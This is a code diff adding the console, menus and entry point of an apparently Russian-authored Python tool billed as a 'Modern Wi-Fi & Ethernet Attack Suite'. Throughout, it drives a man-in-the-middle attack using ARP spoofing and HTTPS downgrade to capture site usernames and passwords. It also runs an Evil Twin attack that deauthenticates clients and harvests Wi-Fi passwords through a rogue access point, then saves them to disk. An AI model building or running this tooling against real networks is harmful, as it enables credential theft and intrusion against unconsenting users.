@@ -1705,3 +1705,668 @@ def run_mitm_attack():
     run_mitm_console(attack)
 
 
+def run_mitm_console(attack: MITMAttack):
+    """Интерактивная консоль MITM"""
+    
+    def render_screen():
+        """Отрисовка экрана"""
+        os.system('clear')
+        
+        try:
+            term_size = os.get_terminal_size()
+            width = term_size.columns
+            height = term_size.lines
+        except:
+            width = 120
+            height = 30
+        
+        print(f"\n{Colors.gradient('='*width, style='claude')}")
+        print(f"{Colors.ORANGE}{'MAN-IN-THE-MIDDLE ATTACK':^{width}}{Colors.RESET}")
+        print(f"{Colors.gradient('='*width, style='claude')}\n")
+        
+        http_status = f"{Colors.GREEN}ON{Colors.RESET}" if attack.http_downgrade else f"{Colors.RED}OFF{Colors.RESET}"
+        
+        if attack.intercepting:
+            log_status = f"{Colors.GREEN}{attack.logging_mode}{Colors.RESET}"
+        else:
+            log_status = f"{Colors.DIM}OFF{Colors.RESET}"
+        
+        status_line = (f"  Target: {Colors.CYAN}{attack.target_ip}{Colors.RESET} | "
+                      f"Gateway: {Colors.CYAN}{attack.gateway_ip}{Colors.RESET} | "
+                      f"HTTP Downgrade: {http_status} | "
+                      f"Capture: {log_status}")
+        print(status_line)
+        print()
+        
+        box_width = (width - 6) // 2
+        log_height = min(height - 20, 12)
+        
+        print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+        print(f"  {Colors.WHITE}{'ATTACK LOG':^{box_width}}{Colors.RESET}   {Colors.WHITE}{'CAPTURED CREDENTIALS':^{box_width}}{Colors.RESET}")
+        print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+        
+        for i in range(log_height):
+            log_idx = len(attack.left_log) - log_height + i
+            if 0 <= log_idx < len(attack.left_log):
+                log_line = attack.left_log[log_idx]
+                clean_line = re.sub(r'\033\[[0-9;]*m', '', log_line)
+                if len(clean_line) > box_width - 2:
+                    log_line = log_line[:box_width - 5] + "..."
+                
+                if '[CREDS]' in log_line:
+                    log_line = f"{Colors.GREEN}{log_line}{Colors.RESET}"
+                elif '[HTTP]' in log_line:
+                    log_line = f"{Colors.CYAN}{log_line}{Colors.RESET}"
+                elif 'ERROR' in log_line:
+                    log_line = f"{Colors.RED}{log_line}{Colors.RESET}"
+                elif 'Username:' in log_line or 'Password:' in log_line:
+                    log_line = f"{Colors.GREEN}{log_line}{Colors.RESET}"
+                elif 'enabled' in log_line.lower() or 'started' in log_line.lower() or 'active' in log_line.lower():
+                    log_line = f"{Colors.GREEN}{log_line}{Colors.RESET}"
+                elif 'stopped' in log_line.lower() or 'disabled' in log_line.lower():
+                    log_line = f"{Colors.YELLOW}{log_line}{Colors.RESET}"
+                elif '===' in log_line or '───' in log_line:
+                    log_line = f"{Colors.ORANGE}{log_line}{Colors.RESET}"
+            else:
+                log_line = ""
+            
+            cred_display_idx = len(attack.captured_data) - log_height + i
+            if 0 <= cred_display_idx < len(attack.captured_data):
+                cred = attack.captured_data[cred_display_idx]
+                if cred.get('type') == 'credentials':
+                    cred_line = f"{cred['site']} | {cred['username']}:{cred['password']}"
+                    if len(cred_line) > box_width - 2:
+                        cred_line = cred_line[:box_width - 5] + "..."
+                    cred_line = f"{Colors.GREEN}{cred_line}{Colors.RESET}"
+                else:
+                    cred_line = ""
+            else:
+                cred_line = ""
+            
+            clean_log = re.sub(r'\033\[[0-9;]*m', '', log_line)
+            log_padding = box_width - len(clean_log)
+            
+            print(f"  {log_line}{' ' * max(0, log_padding)}   {cred_line}")
+        
+        print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+        
+        print(f"\n  {Colors.WHITE}Captured: {Colors.CYAN}{len(attack.captured_data)}{Colors.RESET} credentials")
+        
+        print(f"\n  {Colors.gradient('─'*(width-4), style='claude')}")
+        print(f"  {Colors.ORANGE}Commands:{Colors.RESET} "
+              f"{Colors.WHITE}start <creds|traffic|all>{Colors.RESET} | "
+              f"{Colors.WHITE}http <on|off>{Colors.RESET} | "
+              f"{Colors.WHITE}status{Colors.RESET} | "
+              f"{Colors.WHITE}stop{Colors.RESET} | "
+              f"{Colors.WHITE}help{Colors.RESET}")
+        print(f"  {Colors.gradient('─'*(width-4), style='claude')}")
+    
+    render_screen()
+    
+    try:
+        while attack.running:
+            try:
+                cmd = input(f"\n  {Colors.ORANGE}>{Colors.RESET} ").strip().lower()
+            except EOFError:
+                break
+            
+            if cmd == 'help':
+                os.system('clear')
+                print(f"""
+{Colors.gradient('='*70, style='claude')}
+{Colors.ORANGE}{'MITM COMMANDS HELP':^70}{Colors.RESET}
+{Colors.gradient('='*70, style='claude')}
+
+  {Colors.ORANGE}start <mode>{Colors.RESET}
+      Start capturing traffic/credentials
+      
+      Modes:
+        {Colors.CYAN}creds{Colors.RESET}   - Capture only credentials (usernames/passwords)
+        {Colors.CYAN}traffic{Colors.RESET} - Log all HTTP requests
+        {Colors.CYAN}all{Colors.RESET}     - Capture everything
+      
+      Example: {Colors.WHITE}start creds{Colors.RESET}
+
+  {Colors.ORANGE}http <on|off>{Colors.RESET}
+      Enable/disable HTTPS downgrade (SSLstrip)
+      Attempts to downgrade HTTPS to HTTP
+      
+      {Colors.DIM}Note: HSTS sites may resist this{Colors.RESET}
+
+  {Colors.ORANGE}status{Colors.RESET}
+      Display current attack status
+
+  {Colors.ORANGE}stop{Colors.RESET}
+      Stop attack and return to menu
+
+{Colors.gradient('='*70, style='claude')}
+""")
+                input(f"  {Colors.WHITE}Press Enter to continue...{Colors.RESET}")
+                render_screen()
+            
+            elif cmd.startswith('start'):
+                parts = cmd.split()
+                if len(parts) >= 2:
+                    mode = parts[1]
+                    if mode in ['creds', 'traffic', 'all']:
+                        attack.start_logging(mode)
+                        render_screen()
+                    else:
+                        attack.log(f"Invalid mode: {mode}")
+                        attack.log("Valid modes: creds, traffic, all")
+                        render_screen()
+                else:
+                    attack.log("Usage: start <creds|traffic|all>")
+                    render_screen()
+            
+            elif cmd.startswith('http'):
+                parts = cmd.split()
+                if len(parts) >= 2:
+                    if parts[1] == 'on':
+                        attack.enable_http_downgrade()
+                    elif parts[1] == 'off':
+                        attack.disable_http_downgrade()
+                    else:
+                        attack.log("Usage: http <on|off>")
+                else:
+                    attack.log("Usage: http <on|off>")
+                render_screen()
+            
+            elif cmd == 'status':
+                attack.log("")
+                attack.log("══════════ STATUS ══════════")
+                attack.log(f"Interface:      {attack.interface}")
+                attack.log(f"Target:         {attack.target_ip}")
+                attack.log(f"Gateway:        {attack.gateway_ip}")
+                attack.log(f"ARP Spoofing:   ACTIVE")
+                attack.log(f"HTTP Downgrade: {'ON' if attack.http_downgrade else 'OFF'}")
+                attack.log(f"Capture Mode:   {attack.logging_mode or 'OFF'}")
+                attack.log(f"Credentials:    {len(attack.captured_data)}")
+                attack.log("════════════════════════════")
+                render_screen()
+            
+            elif cmd == 'stop':
+                attack.stop()
+                break
+            
+            elif cmd == '':
+                render_screen()
+            
+            else:
+                attack.log(f"Unknown command: {cmd}")
+                attack.log("Type 'help' for available commands")
+                render_screen()
+            
+    except KeyboardInterrupt:
+        attack.log("Interrupted by user (Ctrl+C)")
+        attack.stop()
+    
+    show_mitm_results(attack)
+
+
+def show_mitm_results(attack: MITMAttack):
+    """Показать результаты MITM атаки"""
+    os.system('clear')
+    
+    print(f"\n{Colors.gradient('='*70, style='claude')}")
+    print(f"{Colors.ORANGE}{'MITM ATTACK RESULTS':^70}{Colors.RESET}")
+    print(f"{Colors.gradient('='*70, style='claude')}\n")
+    
+    print(f"{Colors.WHITE}Attack Information:{Colors.RESET}")
+    print(f"  Interface:   {Colors.CYAN}{attack.interface}{Colors.RESET}")
+    print(f"  Target:      {Colors.CYAN}{attack.target_ip}{Colors.RESET}")
+    print(f"  Gateway:     {Colors.CYAN}{attack.gateway_ip}{Colors.RESET}")
+    print()
+    
+    if attack.captured_data:
+        print(f"{Colors.GREEN}╭{'─' * 68}╮{Colors.RESET}")
+        print(f"{Colors.GREEN}│{'CAPTURED CREDENTIALS':^68}│{Colors.RESET}")
+        print(f"{Colors.GREEN}├{'─' * 68}┤{Colors.RESET}")
+        
+        for item in attack.captured_data[:20]:
+            if item.get('type') == 'credentials':
+                line = f"  {item['site']} | {item['username']} : {item['password']}"
+                if len(line) > 66:
+                    line = line[:63] + "..."
+                print(f"{Colors.GREEN}│{Colors.WHITE}{line:<66}{Colors.GREEN}│{Colors.RESET}")
+        
+        if len(attack.captured_data) > 20:
+            print(f"{Colors.GREEN}│{Colors.DIM}  ... and {len(attack.captured_data) - 20} more{' ' * 45}{Colors.GREEN}│{Colors.RESET}")
+        
+        print(f"{Colors.GREEN}╰{'─' * 68}╯{Colors.RESET}")
+    else:
+        print(f"{Colors.DIM}No credentials captured{Colors.RESET}")
+    
+    print()
+    
+    if attack.log_file:
+        print(f"{Colors.WHITE}Log file: {Colors.CYAN}{attack.log_file}{Colors.RESET}")
+    
+    print(f"\n{Colors.gradient('='*70, style='claude')}\n")
+    
+    input(f"{Colors.WHITE}Press Enter to return to menu...{Colors.RESET}")
+
+
+# ============= MAIN MENU WITH TABS =============
+
+def main_menu():
+    """Главное меню с табами"""
+    tab_system = TabSystem()
+    
+    while True:
+        os.system('clear')
+        
+        banner = """
+ ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
+ ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
+ █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
+ ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
+ ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
+ ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
+                                                            v2.1
+        Modern Wi-Fi & Ethernet Attack Suite
+        WiFi 6 | PMF Bypass | Channel Hopping | MITM | ARP Spoof
+"""
+        print(Colors.gradient(banner, style='claude'))
+        
+        if DEMO_MODE:
+            print(f"{Colors.YELLOW}{'[DEMO MODE]':^65}{Colors.RESET}\n")
+        
+        print(f"\n{Colors.gradient('─'*65)}")
+        print(f"  {tab_system.render_tabs()}")
+        print(f"{Colors.gradient('─'*65)}")
+        print(f"{Colors.DIM}  Press TAB to switch tabs{Colors.RESET}")
+        
+        current_tab = tab_system.get_current_tab()
+        
+        if current_tab == 'WIFI':
+            render_wifi_menu(tab_system)
+        elif current_tab == 'ETHERNET':
+            render_ethernet_menu(tab_system)
+        
+        print(f"\n{Colors.gradient('─'*65)}\n")
+        
+        print(f"{Colors.WHITE}Select option (or TAB to switch): {Colors.RESET}", end='', flush=True)
+        
+        choice = input().strip().lower()
+        
+        if choice == '' or choice == '\t' or choice == 'tab':
+            tab_system.next_tab()
+            continue
+        
+        if current_tab == 'WIFI':
+            if choice == '1':
+                modern_evil_twin_menu()
+            elif choice == '2':
+                quick_scan_menu()
+            elif choice == '3':
+                print(f"\n{Colors.ORANGE}[*] Disabling monitor mode...{Colors.RESET}")
+                interfaces = NetworkInterface.get_interfaces()
+                for iface in interfaces:
+                    NetworkInterface.disable_monitor_mode(iface)
+                print(f"{Colors.WHITE}[✓] Done{Colors.RESET}")
+                time.sleep(2)
+            elif choice == '0':
+                print(f"\n{Colors.ORANGE}[*] Exiting...{Colors.RESET}")
+                sys.exit(0)
+        
+        elif current_tab == 'ETHERNET':
+            if choice == '1':
+                run_mitm_attack()
+            elif choice == '2':
+                run_network_scan()
+            elif choice == '0':
+                print(f"\n{Colors.ORANGE}[*] Exiting...{Colors.RESET}")
+                sys.exit(0)
+
+
+def quick_scan_menu():
+    """Быстрое сканирование WiFi"""
+    interfaces = NetworkInterface.get_interfaces()
+    
+    if not interfaces:
+        print(f"\n{Colors.ORANGE}[!] No adapters{Colors.RESET}")
+        time.sleep(2)
+        return
+    
+    os.system('clear')
+    print(f"\n{Colors.ORANGE}[*] Select adapter for scanning:{Colors.RESET}\n")
+    for i, iface in enumerate(interfaces, 1):
+        print(f"  {Colors.WHITE}[{i}] {iface}{Colors.RESET}")
+    
+    choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
+    
+    try:
+        interface = interfaces[int(choice) - 1]
+    except:
+        return
+    
+    if not NetworkInterface.is_monitor_mode(interface):
+        print(f"\n{Colors.ORANGE}[*] Enabling monitor mode...{Colors.RESET}")
+        NetworkInterface.enable_monitor_mode(interface)
+        interface = interface + 'mon' if not interface.endswith('mon') else interface
+    
+    scanner = APScanner(interface)
+    scanner.scan()
+    
+    input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
+
+
+def modern_evil_twin_menu():
+    """Меню Evil Twin атаки"""
+    interfaces = NetworkInterface.get_interfaces()
+    
+    if len(interfaces) < 2:
+        os.system('clear')
+        print(f"\n{Colors.ORANGE}[!] Need at least 2 Wi-Fi adapters!{Colors.RESET}")
+        print(f"{Colors.WHITE}[*] Found: {len(interfaces)}{Colors.RESET}")
+        input(f"\n{Colors.WHITE}Press Enter to return...{Colors.RESET}")
+        return
+    
+    os.system('clear')
+    print(f"\n{Colors.ORANGE}[*] Select adapter for Evil Twin AP:{Colors.RESET}\n")
+    for i, iface in enumerate(interfaces, 1):
+        mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
+        print(f"  {Colors.WHITE}[{i}] {iface} [{mode}]{Colors.RESET}")
+    
+    ap_choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
+    try:
+        ap_interface = interfaces[int(ap_choice) - 1]
+    except:
+        return
+    
+    os.system('clear')
+    print(f"\n{Colors.ORANGE}[*] Select adapter for deauthentication:{Colors.RESET}\n")
+    for i, iface in enumerate(interfaces, 1):
+        if iface != ap_interface:
+            mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
+            print(f"  {Colors.WHITE}[{i}] {iface} [{mode}]{Colors.RESET}")
+    
+    deauth_choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
+    try:
+        deauth_interface = interfaces[int(deauth_choice) - 1]
+    except:
+        return
+    
+    if ap_interface == deauth_interface:
+        print(f"{Colors.ORANGE}[!] Adapters must be different!{Colors.RESET}")
+        time.sleep(2)
+        return
+    
+    if not NetworkInterface.is_monitor_mode(deauth_interface):
+        print(f"\n{Colors.ORANGE}[*] Enabling monitor mode on {deauth_interface}...{Colors.RESET}")
+        NetworkInterface.enable_monitor_mode(deauth_interface)
+        if not deauth_interface.endswith('mon'):
+            deauth_interface += 'mon'
+        time.sleep(2)
+    
+    scanner = APScanner(deauth_interface)
+    try:
+        networks = scanner.scan()
+    except KeyboardInterrupt:
+        networks = scanner.networks
+    
+    if not networks:
+        print(f"\n{Colors.ORANGE}[!] No networks found{Colors.RESET}")
+        input(f"\n{Colors.WHITE}Press Enter to return...{Colors.RESET}")
+        return
+    
+    print(f"\n{Colors.WHITE}Enter target number: {Colors.RESET}", end='')
+    target_choice = input()
+    
+    try:
+        target = networks[int(target_choice) - 1]
+    except:
+        return
+    
+    os.system('clear')
+    print(f"\n{Colors.gradient('='*70, style='claude')}")
+    print(f"{Colors.ORANGE}{'MODERN EVIL TWIN ATTACK':^70}{Colors.RESET}")
+    print(f"{Colors.gradient('='*70, style='claude')}\n")
+    
+    print(f"{Colors.WHITE}Target:{Colors.RESET}")
+    print(f"  SSID:       {Colors.CYAN}{target['ssid']}{Colors.RESET}")
+    print(f"  BSSID:      {target['bssid']}")
+    print(f"  Channel:    {target['channel']}")
+    print(f"  Encryption: {target['encryption']}")
+    print()
+    
+    print(f"{Colors.WHITE}Interfaces:{Colors.RESET}")
+    print(f"  AP:         {ap_interface}")
+    print(f"  Deauth:     {deauth_interface}")
+    print()
+    
+    confirm = input(f"{Colors.ORANGE}Start attack? (y/n): {Colors.RESET}")
+    if confirm.lower() != 'y':
+        return
+    
+    attack = ModernEvilTwin(ap_interface, deauth_interface, target)
+    
+    print(f"\n{Colors.ORANGE}[*] Initializing attack...{Colors.RESET}\n")
+    attack.setup()
+    
+    print(f"{Colors.ORANGE}[*] Starting attack components...{Colors.RESET}\n")
+    attack.start_attack()
+    
+    animation_frame = 0
+    
+    try:
+        while not attack.attack_successful:
+            os.system('clear')
+            
+            try:
+                term_size = os.get_terminal_size()
+                width = term_size.columns
+                height = term_size.lines
+            except:
+                width = 120
+                height = 30
+            
+            print(f"\n{Colors.gradient('='*width, style='claude')}")
+            status_text = "PASSWORD CAPTURED!" if attack.attack_successful else "ATTACK IN PROGRESS"
+            print(f"{Colors.ORANGE}{status_text:^{width}}{Colors.RESET}")
+            print(f"{Colors.gradient('='*width, style='claude')}\n")
+            
+            stats = attack.get_stats()
+            
+            stat_line = (f"  Channel: {Colors.CYAN}{stats['current_channel']}{Colors.RESET} "
+                        f"({stats['band']}) | "
+                        f"Hops: {Colors.YELLOW}{stats['channel_hops']}{Colors.RESET} | "
+                        f"Clients: {Colors.GREEN}{stats['clients_seen']}{Colors.RESET} | "
+                        f"Deauth: {Colors.ORANGE}{stats['deauth_sent']}{Colors.RESET} | "
+                        f"Passwords: {Colors.CYAN}{stats['passwords_captured']}{Colors.RESET}")
+            print(stat_line)
+            
+            if stats.get('predicted_channel'):
+                print(f"  {Colors.DIM}Predicted next channel: {stats['predicted_channel']}{Colors.RESET}")
+            
+            if stats.get('wifi6_target'):
+                print(f"  {Colors.CYAN}[WiFi 6 Target]{Colors.RESET} ", end='')
+            if stats.get('pmf_enabled'):
+                print(f"{Colors.YELLOW}[PMF Active]{Colors.RESET} ", end='')
+            print(f"{Colors.DIM}Method: {stats.get('bypass_method', 'standard')}{Colors.RESET}")
+            print()
+            
+            box_width = (width - 6) // 2
+            log_height = min(height - 15, 15)
+            
+            print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+            print(f"  {Colors.WHITE}{'DEAUTH LOG':^{box_width}}{Colors.RESET}   {Colors.WHITE}{'AP LOG':^{box_width}}{Colors.RESET}")
+            print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+            
+            for i in range(log_height):
+                deauth_idx = len(attack.deauth_log) - log_height + i
+                if 0 <= deauth_idx < len(attack.deauth_log):
+                    deauth_line = attack.deauth_log[deauth_idx]
+                    if len(deauth_line) > box_width - 2:
+                        deauth_line = deauth_line[:box_width - 5] + "..."
+                    
+                    if 'hop' in deauth_line.lower():
+                        deauth_line = f"{Colors.YELLOW}{deauth_line}{Colors.RESET}"
+                    elif 'client' in deauth_line.lower():
+                        deauth_line = f"{Colors.CYAN}{deauth_line}{Colors.RESET}"
+                else:
+                    deauth_line = ""
+                
+                ap_idx = len(attack.ap_log) - log_height + i
+                if 0 <= ap_idx < len(attack.ap_log):
+                    ap_line = attack.ap_log[ap_idx]
+                    if len(ap_line) > box_width - 2:
+                        ap_line = ap_line[:box_width - 5] + "..."
+                    
+                    if 'SUCCESS' in ap_line or 'PASSWORD' in ap_line.upper():
+                        ap_line = f"{Colors.GREEN}{ap_line}{Colors.RESET}"
+                    elif 'incorrect' in ap_line.lower():
+                        ap_line = f"{Colors.ORANGE}{ap_line}{Colors.RESET}"
+                else:
+                    ap_line = ""
+                
+                print(f"  {deauth_line:<{box_width}}   {ap_line:<{box_width}}")
+            
+            print(f"  {Colors.ORANGE}{'─' * box_width}{Colors.RESET}   {Colors.ORANGE}{'─' * box_width}{Colors.RESET}")
+            
+            status_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
+            spinner = status_chars[animation_frame % len(status_chars)]
+            print(f"\n  {Colors.animate_gradient(f'{spinner} Attacking... Press Ctrl+C to stop', animation_frame)}")
+            
+            animation_frame += 1
+            time.sleep(0.2)
+            
+    except KeyboardInterrupt:
+        pass
+    
+    print(f"\n\n{Colors.ORANGE}[*] Stopping attack...{Colors.RESET}")
+    attack.stop_attack()
+    
+    show_evil_twin_results(attack, target)
+
+
+def show_evil_twin_results(attack: ModernEvilTwin, target: dict):
+    """Показать результаты Evil Twin атаки"""
+    os.system('clear')
+    
+    stats = attack.get_stats()
+    
+    print(f"\n{Colors.gradient('='*80, style='claude')}")
+    print(f"{Colors.ORANGE}{'ATTACK RESULTS':^80}{Colors.RESET}")
+    print(f"{Colors.gradient('='*80, style='claude')}\n")
+    
+    print(f"{Colors.WHITE}Target Information:{Colors.RESET}")
+    print(f"  SSID:         {Colors.CYAN}{target['ssid']}{Colors.RESET}")
+    print(f"  BSSID:        {target['bssid']}")
+    print(f"  Channel:      {target['channel']} ({stats['band']})")
+    print(f"  Encryption:   {target['encryption']}")
+    
+    if stats.get('wifi6_target'):
+        print(f"  WiFi 6:       {Colors.GREEN}Yes{Colors.RESET}")
+    if stats.get('pmf_enabled'):
+        print(f"  PMF:          {Colors.YELLOW}Enabled{Colors.RESET}")
+        print(f"  Bypass:       {stats.get('bypass_method', 'N/A')}")
+    
+    print()
+    
+    if attack.attack_successful and attack.correct_password:
+        print(f"{Colors.gradient('╭' + '─' * 76 + '╮', style='claude')}")
+        print(f"{Colors.GREEN}│{'SUCCESS! PASSWORD CAPTURED':^76}│{Colors.RESET}")
+        print(f"{Colors.gradient('├' + '─' * 76 + '┤', style='claude')}")
+        pwd_display = f"Password: {attack.correct_password}"
+        padding = 76 - len(pwd_display) - 2
+        print(f"{Colors.WHITE}│  {pwd_display}{' ' * padding}│{Colors.RESET}")
+        print(f"{Colors.gradient('╰' + '─' * 76 + '╯', style='claude')}")
+        
+        result_file = f"/tmp/captured_{target['ssid'].replace(' ', '_')}_{int(time.time())}.txt"
+        try:
+            with open(result_file, 'w') as f:
+                f.write(f"SSID: {target['ssid']}\n")
+                f.write(f"BSSID: {target['bssid']}\n")
+                f.write(f"Password: {attack.correct_password}\n")
+                f.write(f"Captured: {datetime.now().isoformat()}\n")
+            print(f"\n{Colors.DIM}Saved to: {result_file}{Colors.RESET}")
+        except:
+            pass
+    else:
+        print(f"{Colors.ORANGE}Status: Attack stopped (no valid password captured){Colors.RESET}")
+    
+    print()
+    
+    print(f"{Colors.WHITE}Statistics:{Colors.RESET}")
+    print(f"  Channel hops detected:  {Colors.YELLOW}{stats['channel_hops']}{Colors.RESET}")
+    print(f"  Clients discovered:     {Colors.GREEN}{stats['clients_seen']}{Colors.RESET}")
+    print(f"  Deauth packets sent:    {Colors.ORANGE}{stats['deauth_sent']}{Colors.RESET}")
+    print(f"  Passwords captured:     {Colors.CYAN}{stats['passwords_captured']}{Colors.RESET}")
+    
+    print()
+    
+    if attack.captured_passwords:
+        print(f"{Colors.WHITE}All Captured Attempts:{Colors.RESET}")
+        for i, pwd in enumerate(attack.captured_passwords[:15], 1):
+            verified = "✓" if attack.correct_password and attack.correct_password in pwd else "✗"
+            color = Colors.GREEN if verified == "✓" else Colors.DIM
+            print(f"  {color}[{i}] {pwd} [{verified}]{Colors.RESET}")
+        
+        if len(attack.captured_passwords) > 15:
+            print(f"  {Colors.DIM}... and {len(attack.captured_passwords) - 15} more{Colors.RESET}")
+    
+    print(f"\n{Colors.gradient('='*80, style='claude')}\n")
+    
+    input(f"{Colors.WHITE}Press Enter to return to main menu...{Colors.RESET}")
+
+
+# ============= ENTRY POINT =============
+
+if __name__ == '__main__':
+    if not DEMO_MODE and os.geteuid() != 0:
+        print(f"\n{Colors.gradient('='*60, style='claude')}")
+        print(f"{Colors.ORANGE}[!] ERROR: Root privileges required!{Colors.RESET}")
+        print(f"{Colors.gradient('='*60, style='claude')}\n")
+        print(f"{Colors.WHITE}Run with sudo:{Colors.RESET}")
+        print(f"  sudo python3 {sys.argv[0]}")
+        print(f"\n{Colors.DIM}Or use demo mode:{Colors.RESET}")
+        print(f"  python3 {sys.argv[0]} --demo")
+        print()
+        sys.exit(1)
+    
+    try:
+        if DEMO_MODE:
+            os.system('clear')
+            print(Colors.gradient("""
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║                      DEMO MODE ACTIVE                        ║
+║                                                              ║
+║              All operations are simulated!                   ║
+║           No real network attacks will occur.                ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+            """, style='claude'))
+            time.sleep(2)
+        
+        if not DEMO_MODE:
+            required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 
+                            'hostapd', 'dnsmasq', 'iwconfig', 'arpspoof']
+            missing = []
+            for tool in required_tools:
+                result = subprocess.run(['which', tool], capture_output=True)
+                if result.returncode != 0:
+                    missing.append(tool)
+            
+            if missing:
+                print(f"\n{Colors.ORANGE}[!] Missing tools: {', '.join(missing)}{Colors.RESET}")
+                print(f"{Colors.WHITE}Install with:{Colors.RESET}")
+                print(f"  apt install aircrack-ng hostapd dnsmasq wireless-tools dsniff")
+                print()
+                response = input(f"{Colors.WHITE}Continue anyway? (y/n): {Colors.RESET}")
+                if response.lower() != 'y':
+                    sys.exit(1)
+        
+        main_menu()
+        
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.ORANGE}[*] Interrupted{Colors.RESET}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n{Colors.ORANGE}[!] Error: {e}{Colors.RESET}")
+        if not DEMO_MODE:
+            import traceback
+            traceback.print_exc()
+        sys.exit(1)
